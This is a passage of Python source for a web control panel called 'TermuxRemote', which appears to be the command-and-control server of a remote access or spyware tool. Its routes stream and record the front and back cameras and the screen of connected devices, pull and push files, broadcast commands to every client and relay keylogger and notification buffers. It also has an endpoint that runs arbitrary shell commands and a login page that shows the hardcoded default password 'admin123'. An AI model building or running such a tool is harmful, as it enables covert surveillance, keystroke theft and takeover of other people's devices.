            name = (data.get("name") or "").strip()
            pw = (data.get("password") or "").strip()
            if not name:
                await http_json(writer, {"error": "name required"}); writer.close(); return
            args = [name]
            if pw: args.append(pw)
            r = await send("unzipdec", args)
            await http_json(writer, r); writer.close(); return

        # ═══ SERVER-SIDE ENCRYPTION ═══
        if method == "GET" and route == "/api/enc/status":
            await http_json(writer, {
                "crypto_available": _CRYPTO_OK,
                "algorithm": "AES-256-GCM",
                "kdf": "PBKDF2-HMAC-SHA256",
                "iterations": ENC_ITER,
                "master_set": bool(ENC_MASTER),
                "auto_encrypt_media": AUTO_ENCRYPT_MEDIA})
            writer.close(); return

        if method == "POST" and route == "/api/enc/encrypt":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            if not _CRYPTO_OK:
                await http_json(writer, {"error": "server crypto unavailable"}); writer.close(); return
            name = os.path.basename(data.get("name", ""))
            pw = data.get("password") or None
            if not name:
                await http_json(writer, {"error": "missing name"}); writer.close(); return
            src = os.path.join(SAVE_DIR, name)
            if not os.path.isfile(src):
                await http_json(writer, {"error": "file not found"}); writer.close(); return
            try:
                out = encrypt_file_inplace(src, pw)
                await http_json(writer, {"ok": True,
                    "name": os.path.basename(out),
                    "size": os.path.getsize(out),
                    "url": f"/download/{os.path.basename(out)}"})
            except Exception as e:
                await http_json(writer, {"error": f"encrypt failed: {e}"})
            writer.close(); return

        if method == "POST" and route == "/api/enc/decrypt":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            if not _CRYPTO_OK:
                await http_json(writer, {"error": "server crypto unavailable"}); writer.close(); return
            name = os.path.basename(data.get("name", ""))
            pw = data.get("password") or None
            if not name:
                await http_json(writer, {"error": "missing name"}); writer.close(); return
            src = os.path.join(SAVE_DIR, name)
            if not os.path.isfile(src):
                await http_json(writer, {"error": "file not found"}); writer.close(); return
            try:
                out = decrypt_file_inplace(src, pw)
                await http_json(writer, {"ok": True,
                    "name": os.path.basename(out),
                    "size": os.path.getsize(out),
                    "url": f"/download/{os.path.basename(out)}"})
            except Exception as e:
                await http_json(writer, {"error": f"decrypt failed: {e}"})
            writer.close(); return

        if method == "POST" and route == "/api/enc/all":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            if not _CRYPTO_OK:
                await http_json(writer, {"error": "server crypto unavailable"}); writer.close(); return
            op = (data.get("op") or "encrypt").lower()
            pat = data.get("pattern") or "*"
            pw = data.get("password") or None
            done = []; errs = []
            for fname in os.listdir(SAVE_DIR):
                fpath = os.path.join(SAVE_DIR, fname)
                if not os.path.isfile(fpath): continue
                if not fnmatch.fnmatch(fname, pat): continue
                try:
                    if op == "encrypt" and not fname.endswith(".enc"):
                        out = encrypt_file_inplace(fpath, pw)
                        done.append(os.path.basename(out))
                    elif op == "decrypt" and fname.endswith(".enc"):
                        out = decrypt_file_inplace(fpath, pw)
                        done.append(os.path.basename(out))
                except Exception as e:
                    errs.append(f"{fname}: {e}")
            await http_json(writer, {"ok": True, "op": op, "done": done, "errors": errs})
            writer.close(); return

        if method == "POST" and route == "/api/enc/upload":
            ctype = headers.get("content-type", "")
            if "boundary=" not in ctype:
                await http_json(writer, {"error": "expect multipart"}); writer.close(); return
            boundary = ctype.split("boundary=", 1)[1].strip().strip('"')
            parts = parse_multipart(body, boundary)
            if "file" not in parts:
                await http_json(writer, {"error": "no file"}); writer.close(); return
            name = parts.get("remote", b"uploaded.bin.enc").decode("utf-8", errors="replace").strip()
            raw = parts["file"]
            if len(raw) > MAX_FILE * 2:
                await http_json(writer, {"error": "too large"}); writer.close(); return
            if not is_encrypted(raw):
                if not _CRYPTO_OK:
                    await http_json(writer, {"error": "server crypto unavailable"})
                    writer.close(); return
                try: raw = encrypt_bytes(raw)
                except Exception as e:
                    await http_json(writer, {"error": f"encrypt failed: {e}"})
                    writer.close(); return
            safe = os.path.basename(name)
            if not safe.endswith(".enc"): safe += ".enc"
            out = unique_path(SAVE_DIR, safe)
            with open(out, "wb") as f: f.write(raw)
            await http_json(writer, {"ok": True,
                "name": os.path.basename(out),
                "size": len(raw),
                "url": f"/download/{os.path.basename(out)}"})
            writer.close(); return

        # ═══ LIVE / STREAMS ═══
        if method == "GET" and route == "/api/live":
            if not active:
                await http_reply(writer, 503, "text/plain", "no client")
                writer.close(); return
            qs = parse_qs(parsed.query)
            facing = (qs.get("facing", ["back"])[0] or "back").lower()
            if facing not in ("back", "front"): facing = "back"
            try: fps = float(qs.get("fps", ["1"])[0])
            except Exception: fps = 1.0
            fps = max(0.3, min(fps, 4.0))
            await http_reply_live(writer, facing, active, fps=fps)
            return

        if method == "POST" and route == "/api/livevideo/clip":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            if not active:
                await http_json(writer, {"error": "no client"}); writer.close(); return
            session = str(data.get("session", ""))[:64] or "default"
            facing = (data.get("facing", "back") or "back").lower()
            if facing not in ("back", "front"): facing = "back"
            secs = max(1, min(int(data.get("secs", 2)), 10))
            r = await record_live_video(session, facing, secs)
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/livevideo/stop":
            try: data = json.loads(body.decode())
            except Exception: data = {}
            session = str(data.get("session", ""))[:64]
            if session: cleanup_live_session(session)
            await http_json(writer, {"ok": True}); writer.close(); return

        if method == "POST" and route == "/api/livescreen/clip":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            if not active:
                await http_json(writer, {"error": "no client"}); writer.close(); return
            session = str(data.get("session", ""))[:64] or "default"
            secs = max(1, min(int(data.get("secs", 2)), 10))
            r = await record_live_screen(session, secs)
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/livescreen/stop":
            try: data = json.loads(body.decode())
            except Exception: data = {}
            session = str(data.get("session", ""))[:64]
            if session: cleanup_live_session(session)
            await http_json(writer, {"ok": True}); writer.close(); return

        # ═══ CLIENT SELECTION ═══
        if method == "POST" and route == "/api/use":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            cid = data.get("id")
            if cid in clients:
                active = cid
                r = await send("pwd", to=cid)
                if "output" in r: remote_cwd = r["output"].strip()
                await sse_broadcast("cwd", {"cwd": remote_cwd})
                await sse_broadcast("clients",
                    {"clients": clients_snapshot(), "active": active})
                await sse_broadcast("projection_state",
                    {"client": cid,
                     **projection_state.get(cid, {}),
                     "ts": (projection_state.get(cid) or {}).get("ts", 0)})
                await http_json(writer, {"ok": True, "active": active,
                    "cwd": remote_cwd,
                    "projection": projection_state.get(cid, {})})
            else:
                await http_json(writer, {"error": "no such client"})
            writer.close(); return

        # ═══ GENERIC SEND ═══
        if method == "POST" and route == "/api/send":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            if "line" in data:
                try: parts = shlex.split(data["line"])
                except Exception as e:
                    await http_json(writer, {"error": f"parse: {e}"}); writer.close(); return
                cmd = parts[0] if parts else ""
                args = parts[1:]
            else:
                cmd = data.get("cmd", ""); args = data.get("args", [])
            is_ctrl_frame = (cmd == "screenshot" and args and str(args[0]).startswith("_ctrl_frame"))
            if is_ctrl_frame: pass
            elif cmd == "photo" and len(args) >= 2 and args[1] == "_live_preview.jpg":
                await http_json(writer, {"error": "reserved filename"}); writer.close(); return
            elif cmd == "video" and len(args) >= 2 and str(args[1]).startswith("_liveclip_"):
                await http_json(writer, {"error": "reserved filename"}); writer.close(); return
            elif cmd == "screenrec" and len(args) >= 2 and str(args[1]).startswith("_livescr_"):
                await http_json(writer, {"error": "reserved filename"}); writer.close(); return

            r = await send(cmd, args)
            if is_ctrl_frame:
                await http_json(writer, r if isinstance(r, dict) else {"output": str(r)})
                writer.close(); return
            r = process_media_response(r)
            await http_json(writer, r if isinstance(r, dict) else {"output": str(r)})
            writer.close(); return

        if method == "POST" and route == "/api/all":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            if "line" in data:
                try: parts = shlex.split(data["line"])
                except Exception: parts = []
                cmd = parts[0] if parts else ""
                args = parts[1:]
            else:
                cmd = data.get("cmd", ""); args = data.get("args", [])
            results = []
            for cid in list(clients.keys()):
                r = await send(cmd, args, to=cid)
                out = r.get("output", r.get("error", "?"))[:300]
                results.append({"id": cid, "out": out, "err": "error" in r})
            await http_json(writer, {"results": results}); writer.close(); return

        if method == "POST" and route == "/api/get":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            remote = data.get("remote")
            want_enc = bool(data.get("encrypt", False))
            if not remote:
                await http_json(writer, {"error": "missing remote"}); writer.close(); return
            r = await send("get", [remote])
            if "error" in r:
                await http_json(writer, r); writer.close(); return
            b64 = r.get("file", "")
            if not b64:
                await http_json(writer, {"error": "no data"}); writer.close(); return
            try: raw = base64.b64decode(b64)
            except Exception as e:
                await http_json(writer, {"error": f"decode: {e}"}); writer.close(); return
            already_enc = is_encrypted(raw)
            if want_enc and not already_enc and _CRYPTO_OK:
                try:
                    raw = encrypt_bytes(raw); already_enc = True
                except Exception as e:
                    await http_json(writer, {"error": f"encrypt failed: {e}"})
                    writer.close(); return
            base_name = os.path.basename(remote) or f"incoming_{int(time.time())}.bin"
            if already_enc and not base_name.endswith(".enc"): base_name += ".enc"
            out = unique_path(SAVE_DIR, base_name)
            try:
                with open(out, "wb") as f: f.write(raw)
            except Exception as e:
                await http_json(writer, {"error": f"save failed: {e}"}); writer.close(); return
            await http_json(writer, {"ok": True, "name": os.path.basename(out),
                "size": len(raw), "encrypted": already_enc,
                "url": f"/download/{os.path.basename(out)}"})
            writer.close(); return

        if method == "POST" and route == "/api/put":
            ctype = headers.get("content-type", "")
            if "boundary=" not in ctype:
                await http_json(writer, {"error": "expect multipart"}); writer.close(); return
            boundary = ctype.split("boundary=", 1)[1].strip().strip('"')
            parts = parse_multipart(body, boundary)
            if "file" not in parts:
                await http_json(writer, {"error": "no file"}); writer.close(); return
            remote = parts.get("remote", b"").decode("utf-8", errors="replace").strip() or "uploaded.bin"
            raw = parts["file"]
            if len(raw) > MAX_FILE:
                await http_json(writer, {"error": "too large"}); writer.close(); return
            b64 = base64.b64encode(raw).decode()
            r = await send("put", [remote, b64])
            if "error" in r:
                await http_json(writer, r)
            else:
                await http_json(writer, {
                    "output": r.get("output", f"uploaded {len(raw)} bytes → {remote}"),
                    "size": len(raw)})
            writer.close(); return

        if method == "POST" and route == "/api/local":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            cmd = data.get("cmd", "")
            try:
                proc = subprocess.run(cmd, shell=True, executable="/bin/sh",
                    capture_output=True, text=True, timeout=60)
                await http_json(writer, {"output": (proc.stdout or "") + (proc.stderr or ""),
                    "exit": proc.returncode})
            except Exception as e:
                await http_json(writer, {"error": str(e)})
            writer.close(); return

        if method == "GET" and route.startswith("/download/"):
            name = unquote(route[len("/download/"):])
            safe = os.path.basename(name)
            if safe != name or "/" in safe or "\\" in safe:
                await http_reply(writer, 400, "text/plain", "bad path"); writer.close(); return
            fpath = os.path.join(SAVE_DIR, safe)
            if not os.path.isfile(fpath):
                await http_reply(writer, 404, "text/plain", "not found"); writer.close(); return
            with open(fpath, "rb") as f: data = f.read()
            ctype = mime_for(safe)
            inline = ctype.startswith(("image/", "video/", "audio/")) or ctype.startswith("text/")
            disp = "inline" if inline else "attachment"
            extra = {"Content-Disposition": f'{disp}; filename="{safe}"',
                     "Cache-Control": "no-cache", "Accept-Ranges": "bytes"}
            rng = headers.get("range", "")
            if rng.startswith("bytes="):
                try:
                    r = rng[6:].split(",")[0]
                    rs, _, re_ = r.partition("-")
                    start = int(rs) if rs else 0
                    end = int(re_) if re_ else len(data) - 1
                    if start < 0: start = 0
                    if end >= len(data): end = len(data) - 1
                    if start > end: raise ValueError("bad range")
                    chunk = data[start:end + 1]
                    extra["Content-Range"] = f"bytes {start}-{end}/{len(data)}"
                    await http_reply(writer, 206, ctype, chunk, extra)
                except Exception:
                    await http_reply(writer, 200, ctype, data, extra)
            else:
                await http_reply(writer, 200, ctype, data, extra)
            writer.close(); return

        await http_reply(writer, 404, "text/plain", "not found")
        writer.close()
    except asyncio.CancelledError: raise
    except _ABORT_EXCS:
        try: writer.close()
        except Exception: pass
    except Exception as e:
        try: print(f"{C.RED} http error: {e}{C.RESET}")
        except Exception: pass
        try: writer.close()
        except Exception: pass


async def http_reply_sse(writer):
    writer.write(("\r\n".join([
        "HTTP/1.1 200 OK", "Content-Type: text/event-stream",
        "Cache-Control: no-cache", "X-Accel-Buffering: no",
        "Access-Control-Allow-Origin: *", "Connection: keep-alive",
    ]) + "\r\n\r\n").encode("latin-1"))
    try: await writer.drain()
    except Exception: return
    q = asyncio.Queue(maxsize=200)
    sse_subscribers.add(q)
    try:
        init = {"clients": clients_snapshot(), "active": active, "cwd": remote_cwd,
                "projection": projection_state.get(active, {}) if active else {},
                "keylog": keylog_buffer[-KEYLOG_KEEP:],
                "notif": notif_buffer[-NOTIF_KEEP:]}
        writer.write(f"event: state\ndata: {json.dumps(init)}\n\n".encode("utf-8"))
        await writer.drain()
    except Exception: pass
    try:
        while True:
            msg = await q.get()
            writer.write(msg.encode("utf-8"))
            await writer.drain()
    except asyncio.CancelledError: raise
    except _ABORT_EXCS: pass
    except Exception: pass
    finally:
        sse_subscribers.discard(q)
        try: writer.close()
        except Exception: pass


# ══════════════════════════════════════════════════════════════════════
#   LOGIN PAGE
# ══════════════════════════════════════════════════════════════════════
LOGIN_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Sign in · TermuxRemote</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{--bg:#080c12;--panel:#111a24;--panel2:#16212e;--border:#1e2c3d;
  --text:#e2ecf5;--text-dim:#8fa0b3;--text-mute:#5d6f85;
  --cyan:#4dd0e1;--green:#6ee7a5;--red:#ff7a85;
  --grad:linear-gradient(135deg,#4dd0e1 0%,#6ee7a5 100%);}
*{box-sizing:border-box}html,body{height:100%;margin:0}
body{background:radial-gradient(1000px 700px at 20% 0%,rgba(77,208,225,.10),transparent 60%),
  radial-gradient(800px 600px at 100% 100%,rgba(199,155,255,.10),transparent 60%),var(--bg);
  color:var(--text);font-family:'Inter',system-ui,sans-serif;
  display:flex;align-items:center;justify-content:center;padding:20px;}
.login-box{width:100%;max-width:400px;background:var(--panel);border:1px solid var(--border);
  border-radius:18px;padding:36px 32px;box-shadow:0 30px 80px rgba(0,0,0,.6);position:relative;overflow:hidden;}
.logo{width:56px;height:56px;border-radius:14px;background:var(--grad);
  display:flex;align-items:center;justify-content:center;font-size:28px;color:#03212a;
  font-weight:700;box-shadow:0 8px 24px rgba(77,208,225,.35);margin-bottom:18px;}
h1{margin:0 0 6px;font-size:20px;font-weight:700}
.sub{color:var(--text-mute);font-size:12.5px;margin-bottom:26px}
label{display:block;font-size:11.5px;color:var(--text-dim);text-transform:uppercase;
  letter-spacing:1px;font-weight:600;margin-bottom:8px}
input[type=password]{width:100%;background:var(--panel2);border:1px solid var(--border);
  color:var(--text);padding:13px 15px;border-radius:10px;font-family:inherit;font-size:14px;outline:none}
input[type=password]:focus{border-color:var(--cyan);box-shadow:0 0 0 3px rgba(77,208,225,.14)}
button{width:100%;margin-top:20px;padding:13px;background:var(--grad);color:#03212a;
  border:none;border-radius:10px;font-family:inherit;font-size:14px;font-weight:700;cursor:pointer}
button:disabled{opacity:.6;cursor:wait}
.err{margin-top:14px;padding:11px 14px;background:rgba(255,122,133,.12);
  border:1px solid rgba(255,122,133,.3);border-radius:8px;color:var(--red);
  font-size:12.5px;display:none}.err.show{display:block}
.hint{margin-top:20px;padding-top:18px;border-top:1px solid var(--border);
  font-size:11.5px;color:var(--text-mute);text-align:center;line-height:1.7}
.hint b{color:var(--cyan);font-family:ui-monospace,Consolas,monospace}
</style>
</head>
<body>
<form class="login-box" id="login-form" autocomplete="off">
  <div class="logo">◆</div>
  <h1>TermuxRemote</h1>
  <div class="sub">Sign in to access the control panel</div>
  <label for="pw">Password</label>
  <input type="password" id="pw" autofocus autocomplete="current-password">
  <button type="submit" id="btn">Sign in →</button>
  <div class="err" id="err"></div>
  <div class="hint">Default password is <b>admin123</b><br>
    Change it from the dashboard settings after login.</div>
</form>
<script>
const form=document.getElementById('login-form');
const btn=document.getElementById('btn');
const err=document.getElementById('err');
form.addEventListener('submit', async e=>{
  e.preventDefault(); err.classList.remove('show');
  const pw=document.getElementById('pw').value;
  if(!pw) return;
  btn.disabled=true; btn.textContent='Signing in…';
  try{
    const r=await fetch('/api/login',{method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({password:pw})}).then(x=>x.json());
    if(r.ok){ location.href='/'; return; }
    err.textContent = r.error || 'Login failed';
    err.classList.add('show');
  }catch(ex){ err.textContent='Network error: '+ex.message; err.classList.add('show'); }
  finally{ btn.disabled=false; btn.textContent='Sign in →'; }
});
</script>
</body>
</html>
"""


# ══════════════════════════════════════════════════════════════════════
#   MAIN DASHBOARD HTML (v3.10.1 — with projection banner)
# ══════════════════════════════════════════════════════════════════════
HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>TermuxRemote · Control Panel</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%E2%97%86%3C/text%3E%3C/svg%3E">
<style>
:root{--bg:#080c12;--bg-soft:#0c1219;--panel:#111a24;--panel2:#16212e;--panel3:#1c2a3a;
  --border:#1e2c3d;--border-soft:#16212e;--text:#e2ecf5;--text-dim:#8fa0b3;--text-mute:#5d6f85;
  --cyan:#4dd0e1;--cyan-soft:#2a8a9a;--green:#6ee7a5;--yellow:#ffcc66;--red:#ff7a85;
  --magenta:#c79bff;--blue:#82b1ff;
  --grad1:linear-gradient(135deg,#4dd0e1 0%,#6ee7a5 100%);
  --grad2:linear-gradient(135deg,#c79bff 0%,#82b1ff 100%);
  --shadow:0 8px 32px rgba(0,0,0,.5);--shadow-sm:0 2px 8px rgba(0,0,0,.3);
  --radius:12px;--radius-sm:8px;--transition:all .18s cubic-bezier(.4,0,.2,1);}
[data-theme="light"]{--bg:#f3f6fa;--bg-soft:#e9eef4;--panel:#fff;--panel2:#f6f9fc;--panel3:#eaf0f6;
  --border:#d8e2ec;--border-soft:#e6edf4;--text:#1a2332;--text-dim:#556578;--text-mute:#8794a6;
  --cyan:#0288a8;--cyan-soft:#58c8d8;--shadow:0 8px 32px rgba(40,60,90,.10);--shadow-sm:0 2px 8px rgba(40,60,90,.06);}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;margin:0}
body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;
  font-size:14px;display:flex;height:100vh;overflow:hidden}
::-webkit-scrollbar{width:9px;height:9px}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:6px;border:2px solid transparent;background-clip:padding-box}
.sidebar{width:290px;background:var(--panel);border-right:1px solid var(--border);
  display:flex;flex-direction:column;flex-shrink:0;transition:margin-left .25s;z-index:20}
.sidebar.collapsed{margin-left:-290px}
.brand{padding:18px 20px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px}
.brand .logo{width:38px;height:38px;border-radius:10px;background:var(--grad1);
  display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:700;color:#03212a;flex-shrink:0}
.brand-text{flex:1;min-width:0}
.brand h1{margin:0;font-size:14.5px;font-weight:700;color:var(--text)}
.brand .sub{color:var(--text-mute);font-size:10.5px;margin-top:2px;letter-spacing:.4px;text-transform:uppercase;font-weight:600}
.brand .theme-toggle{width:32px;height:32px;border-radius:8px;background:var(--panel2);border:1px solid var(--border);
  color:var(--text-dim);cursor:pointer;font-size:15px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.sidebar-search{padding:10px 14px;border-bottom:1px solid var(--border)}
.sidebar-search input{width:100%;background:var(--panel2);border:1px solid var(--border);color:var(--text);
  padding:8px 12px;border-radius:8px;font-family:inherit;font-size:12.5px;outline:none}
.sidebar-title{padding:14px 20px 8px;font-size:10.5px;letter-spacing:1.4px;color:var(--text-mute);
  text-transform:uppercase;font-weight:700;display:flex;justify-content:space-between;align-items:center}
.sidebar-title .count{background:var(--panel2);color:var(--text-dim);padding:1px 8px;border-radius:10px;font-size:10px;font-weight:700}
.client-list{list-style:none;margin:0;padding:4px 10px;flex:1;overflow-y:auto}
.client-item{padding:11px 12px;border-radius:10px;margin-bottom:5px;cursor:pointer;
  border:1px solid transparent;transition:var(--transition);position:relative;overflow:hidden}
.client-item:hover{background:var(--panel2);border-color:var(--border)}
.client-item.active{background:linear-gradient(135deg,rgba(77,208,225,.12),rgba(110,231,165,.06));border-color:var(--cyan)}
.client-item.active::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--grad1)}
.client-item .cid{color:var(--text);font-weight:600;font-size:13px;display:flex;align-items:center;gap:8px}
.client-item.active .cid{color:var(--cyan)}
.client-item .cid .name{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.client-item .cid .dot{width:8px;height:8px;border-radius:50%;background:var(--text-mute);flex-shrink:0}
.client-item.active .cid .dot{background:var(--green);animation:pulse-dot 2s infinite}
@keyframes pulse-dot{0%{box-shadow:0 0 0 0 rgba(110,231,165,.7)}70%{box-shadow:0 0 0 8px rgba(110,231,165,0)}100%{box-shadow:0 0 0 0 rgba(110,231,165,0)}}
.client-item .meta{color:var(--text-mute);font-size:11px;margin-top:5px;padding-left:16px;display:flex;gap:6px;flex-wrap:wrap}
.client-item .meta .tag{background:var(--panel3);padding:1px 6px;border-radius:4px;font-size:10px;color:var(--text-dim)}
.no-clients{color:var(--text-mute);text-align:center;padding:32px 16px;font-size:12.5px}
.sidebar-footer{padding:12px 16px;border-top:1px solid var(--border);background:var(--panel2);font-size:11px;color:var(--text-mute);display:flex;flex-direction:column;gap:6px}
.sidebar-footer .row{display:flex;justify-content:space-between}
.sidebar-footer .val{color:var(--text-dim);font-weight:600}
.health-dot{width:8px;height:8px;border-radius:50%;background:var(--green);display:inline-block;margin-right:5px}
.health-dot.warn{background:var(--yellow)}.health-dot.err{background:var(--red)}
.main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
.topbar{display:flex;align-items:center;gap:14px;padding:12px 20px;background:var(--panel);border-bottom:1px solid var(--border);flex-shrink:0}
.menu-toggle{width:34px;height:34px;background:var(--panel2);border:1px solid var(--border);color:var(--text-dim);border-radius:8px;cursor:pointer;font-size:16px;display:none}
.breadcrumb{flex:1;min-width:0;display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text-dim)}
.breadcrumb .root{color:var(--text-mute);font-size:12px}
.breadcrumb .cur{color:var(--cyan);font-weight:600;font-family:ui-monospace,Consolas,monospace}
.topbar-info{display:flex;align-items:center;gap:10px}
.topbar-info .clock{font-family:ui-monospace,Consolas,monospace;font-weight:600;color:var(--text-dim);
  background:var(--panel2);padding:6px 12px;border-radius:8px;border:1px solid var(--border);font-size:12px}
.icon-btn{width:34px;height:34px;background:var(--panel2);border:1px solid var(--border);color:var(--text-dim);
  border-radius:8px;cursor:pointer;font-size:15px;display:flex;align-items:center;justify-content:center}
.icon-btn:hover{color:var(--cyan);border-color:var(--cyan)}
.tabs{display:flex;gap:2px;padding:0 12px;background:var(--panel);border-bottom:1px solid var(--border);overflow-x:auto;flex-shrink:0}
.tabs::-webkit-scrollbar{display:none}
.tab{padding:12px 15px;background:transparent;border:none;color:var(--text-dim);font-family:inherit;font-size:13px;
  font-weight:500;cursor:pointer;border-bottom:2px solid transparent;transition:var(--transition);white-space:nowrap;
  display:flex;align-items:center;gap:7px}
.tab:hover{color:var(--text)}
.tab.active{color:var(--cyan);border-bottom-color:var(--cyan)}
.tab .badge{display:inline-block;background:var(--red);color:#fff;font-size:9.5px;padding:1px 6px;border-radius:10px;font-weight:700;min-width:16px;text-align:center}
.tab .badge.hidden{display:none}.tab .badge.mag{background:var(--magenta)}
.panels{flex:1;overflow-y:auto;overflow-x:hidden}
.panel{display:none;padding:22px;max-width:1400px;margin:0 auto;width:100%}
.panel.active{display:block;animation:fadeIn .25s ease-out}
@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
.card{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:16px;box-shadow:var(--shadow-sm)}
.card.hero{background:linear-gradient(135deg,var(--panel) 0%,var(--panel2) 100%);border-color:rgba(77,208,225,.25);position:relative;overflow:hidden}
.card-title{font-size:11.5px;color:var(--text-mute);text-transform:uppercase;letter-spacing:1.2px;margin:0 0 16px 0;font-weight:700;display:flex;justify-content:space-between;align-items:center;gap:12px}
.hero-device{display:flex;align-items:center;gap:18px;flex-wrap:wrap}
.hero-avatar{width:64px;height:64px;border-radius:16px;background:var(--grad1);display:flex;align-items:center;justify-content:center;font-size:30px;flex-shrink:0}
.hero-info{flex:1;min-width:200px}
.hero-info .name{font-size:19px;font-weight:700;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.hero-info .name .pill{font-size:10px;padding:3px 9px;border-radius:12px;background:var(--panel3);color:var(--text-dim);font-weight:600;text-transform:uppercase}
.hero-info .sub{color:var(--text-dim);font-size:12.5px;margin-top:5px;font-family:ui-monospace,Consolas,monospace}
.hero-stats{display:flex;gap:20px;flex-wrap:wrap;margin-top:16px;padding-top:16px;border-top:1px solid var(--border-soft)}
.hero-stat{display:flex;flex-direction:column;gap:3px}
.hero-stat .lbl{font-size:10px;color:var(--text-mute);text-transform:uppercase;letter-spacing:1px;font-weight:700}
.hero-stat .val{font-size:14px;color:var(--text);font-weight:600;font-family:ui-monospace,Consolas,monospace}
.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:10px}
.info-item{background:var(--panel2);border-radius:10px;padding:12px 14px;border:1px solid var(--border-soft)}
.info-item .label{color:var(--text-mute);font-size:10px;text-transform:uppercase;letter-spacing:.9px;margin-bottom:7px;font-weight:700}
.info-item .value{color:var(--text);font-size:13px;word-break:break-all;font-family:ui-monospace,Consolas,monospace;font-weight:500}
.info-item .value.ok{color:var(--green)}.info-item .value.bad{color:var(--red)}.info-item .value.cyan{color:var(--cyan)}
.status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--text-mute);margin-right:4px}
.status-dot.ok{background:var(--green)}.status-dot.bad{background:var(--red)}
.actions-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px}
.action-btn{background:var(--panel2);border:1px solid var(--border);color:var(--text);padding:15px 12px;border-radius:10px;cursor:pointer;font-family:inherit;font-size:12.5px;display:flex;flex-direction:column;align-items:center;gap:8px;text-align:center;font-weight:500}
.action-btn:hover{background:var(--panel3);border-color:var(--cyan);transform:translateY(-2px)}
.action-btn:disabled{opacity:.55;cursor:wait}
.action-btn .icon{font-size:22px}.action-btn .label{font-size:12px;color:var(--text-dim)}
.row{display:flex;gap:10px;align-items:center;margin-bottom:10px;flex-wrap:wrap}
.row label{color:var(--text-dim);font-size:12px}
input[type=text],input[type=number],input[type=password],textarea,select{background:var(--panel2);border:1px solid var(--border);color:var(--text);padding:8px 12px;border-radius:8px;font-family:inherit;font-size:13px;outline:none}
input[type=text]:focus,input[type=number]:focus,input[type=password]:focus{border-color:var(--cyan)}
input[type=text]{flex:1}input[type=number]{width:100px}
.btn{background:var(--panel2);border:1px solid var(--border);color:var(--text);padding:8px 16px;border-radius:8px;cursor:pointer;font-family:inherit;font-size:13px;font-weight:500;display:inline-flex;align-items:center;gap:6px}
.btn:hover{background:var(--panel3);border-color:var(--cyan);color:var(--cyan)}
.btn.primary{background:var(--grad1);color:#03212a;border-color:transparent;font-weight:600}
.btn.danger{color:var(--red);border-color:rgba(255,122,133,.3)}
.btn.small{padding:5px 10px;font-size:12px;border-radius:6px}
.segmented{display:inline-flex;background:var(--panel2);border-radius:9px;padding:3px;border:1px solid var(--border)}
.segmented button{background:transparent;border:none;color:var(--text-dim);padding:8px 16px;border-radius:7px;cursor:pointer;font-family:inherit;font-size:12.5px;font-weight:500}
.segmented button.active{background:var(--cyan);color:#03212a;font-weight:600}
.live-view{position:relative;width:100%;min-height:320px;background:#000;border-radius:var(--radius);overflow:hidden;display:flex;align-items:center;justify-content:center;border:1px solid var(--border)}
.live-view img,.live-view video{max-width:100%;max-height:72vh;display:block;border-radius:var(--radius)}
.live-indicator{position:absolute;top:14px;left:14px;display:flex;align-items:center;gap:8px;background:rgba(0,0,0,.75);padding:7px 14px;border-radius:20px;font-size:11px;color:#fff;font-weight:700;text-transform:uppercase;z-index:5}
.live-indicator .dot{width:8px;height:8px;border-radius:50%;background:#ff3b30;animation:pulse-dot 1.4s infinite}
.live-indicator.paused .dot{background:#666;animation:none}
.live-stats{position:absolute;top:14px;right:14px;background:rgba(0,0,0,.75);padding:7px 14px;border-radius:20px;font-size:11px;color:#ccc;font-family:ui-monospace,Consolas,monospace;z-index:5;display:flex;gap:10px}
.live-view .live-placeholder{color:var(--text-dim);font-size:13px;display:flex;flex-direction:column;align-items:center;gap:12px;padding:48px}
.gallery-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px}
